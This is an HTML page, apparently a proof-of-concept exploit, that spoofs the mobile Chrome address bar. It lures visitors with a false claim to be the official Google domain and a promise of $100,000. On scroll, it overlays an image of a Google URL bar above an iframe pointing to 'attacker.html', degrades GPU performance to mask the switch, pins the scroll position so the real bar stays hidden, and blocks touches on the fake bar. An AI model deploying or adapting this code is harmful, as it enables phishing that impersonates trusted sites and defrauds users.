<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"
    />
    <title>azzzab</title>
    <style>
      body,
      html {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 300vh; /* Bikin halaman sangat panjang agar tidak mudah mentok */
        background-color: #f8f9fa;
        font-family: sans-serif;
        overflow-x: hidden;
        /* MATIKAN EFEK BOUNCE/MANTUL DI ANDROID & IOS */
        overscroll-behavior-y: none !important;
      }

      #scroll-bait {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        text-align: center;
        color: #5f6368;
        padding: 20px;
      }

      #fake-ui {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        z-index: 99999;
        background: #fff;
        /* Kunci interaksi default agar tidak memicu sistem UI browser */
        touch-action: none; 
      }

      #fake-bar {
        position: absolute;
        bottom: 0; /* KHUSUS CHROME BAR BAWAH */
        left: 0;
        width: 100%;
        height: 56px;
        object-fit: contain;
        border-top: 1px solid #ddd;
        z-index: 100;
        opacity: 0;
        transition: opacity 0.1s ease-in;
        pointer-events: auto;
        -webkit-user-drag: none;
      }

      #fake-content {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: calc(100vh - 56px); /* Berhenti tepat di atas fake bar */
        border: none;
        z-index: 1;
      }

      #gpu-killer {
        position: fixed;
        top: 0;
        left: 0;
        width: 1px;
        height: 1px;
        pointer-events: none;
        z-index: 1;
      }
    </style>
  </head>
  <body>
    <div id="scroll-bait">
      <h2>
        This is the official Google domain. Want to earn $100,000?<br>
        Scroll down to the bottom to verify.
      </h2>
      <div style="font-size: 50px; color: #1a73e8; margin-top: 30px">↓</div>
    </div>

    <div id="gpu-killer"></div>

    <div id="fake-ui">
      <img id="fake-bar" src="urlbar-google.jpg" alt="Google Address Bar" />
      <iframe id="fake-content" src="attacker.html"></iframe>
    </div>

    <script>
      let isSpoofed = false;

      // GPU Killer yang dioptimasi agar Android tidak nge-lag parah
      function triggerMeltdown() {
        const killerContainer = document.getElementById("gpu-killer");
        for (let i = 0; i < 400; i++) { // Jumlah dikurangi agar lancar tapi tetap stutter
          let div = document.createElement("div");
          div.style.cssText = `position:absolute; width:100vw; height:10vh; background:rgba(0,0,0,0.01); backdrop-filter:blur(5px); transform:rotate(${Math.random() * 360}deg);`;
          killerContainer.appendChild(div);
        }
        let start = Date.now();
        while (Date.now() - start < 250) {} // Busy-wait dikurangi ke 250ms
      }

      window.addEventListener(
        "scroll",
        () => {
          // Trigger Spoofing
          if (window.scrollY > 80 && !isSpoofed) {
            isSpoofed = true;
            document.getElementById("fake-ui").style.display = "block";
            triggerMeltdown();
            
            // PINNED COORDINATE: Tendang ke posisi 50px agar bar asli ngumpet
            window.scrollTo(0, 50);
          }

          // ANTI-MENTOK LOGIC (The Ghost Anchor)
          if (isSpoofed) {
            const currentScroll = window.pageYOffset;
            const maxScroll = document.documentElement.scrollHeight - window.innerHeight;

            // Jika nyoba ditarik ke paling atas (mentok atas)
            if (currentScroll <= 2) {
                window.scrollTo(0, 5);
            }
            // Jika nyoba ditarik ke paling bawah (mentok bawah - Trigger Omnibox Bawah)
            if (currentScroll >= maxScroll - 2) {
                window.scrollTo(0, maxScroll - 10);
            }
          }
        },
        { passive: false },
      );

      window.addEventListener("message", (e) => {
        if (e.data === "SNAP_TRAP") {
          let fakeBar = document.getElementById("fake-bar");
          fakeBar.style.opacity = "1";
          fakeBar.style.pointerEvents = "auto";
          
          // KUNCI KOORDINAT: Paksa stay di zona hantu setiap 20ms
          setInterval(() => {
            if (isSpoofed) {
              if (window.scrollY < 20 || window.scrollY > 80) {
                window.scrollTo(0, 50);
              }
            }
          }, 20);
        }
      });

      // BLOKIR TOTAL PADA FAKE BAR
      const fb = document.getElementById("fake-bar");
      const block = (e) => {
        if (isSpoofed) {
          e.preventDefault();
          e.stopPropagation();
        }
      };

      ['touchstart', 'touchmove', 'touchend', 'contextmenu'].forEach(evt => {
        fb.addEventListener(evt, block, { passive: false });
      });
    </script>
  </body>
</html>
